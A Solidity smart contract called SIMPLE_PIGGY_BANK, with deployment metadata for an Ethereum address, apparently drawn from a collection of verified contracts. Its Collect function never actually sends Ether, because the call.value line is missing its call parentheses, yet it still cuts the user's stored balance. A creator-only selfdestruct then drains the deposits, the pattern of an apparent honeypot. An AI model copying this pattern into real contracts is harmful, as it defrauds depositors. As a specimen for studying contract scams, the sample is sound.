
//Address: 0xCc27ce64cf6F807CEBFac616CCFe512641fa503d
//Contract name: SIMPLE_PIGGY_BANK
//Balance: 0.490000023874 Ether
//Verification Date: 3/16/2018
//Transacion Count: 2

// CODE STARTS HERE

pragma solidity ^0.4.19;

contract SIMPLE_PIGGY_BANK
{
    address creator = msg.sender;
    
    mapping (address => uint) public Bal;
    
    uint public MinSum = 1 ether;
    
    function() 
    public 
    payable
    {
        Bal[msg.sender]+=msg.value;
    }  
    
    function Collect(uint _am)
    public
    payable
    {
        if(Bal[msg.sender]>=MinSum && _am<=Bal[msg.sender])
        {
            msg.sender.call.value(_am);
            Bal[msg.sender]-=_am;
        }
    }
    
    function Break()
    public
    payable
    {
        if(msg.sender==creator && this.balance>= MinSum)
        {
            selfdestruct(msg.sender);
        }
    }
}
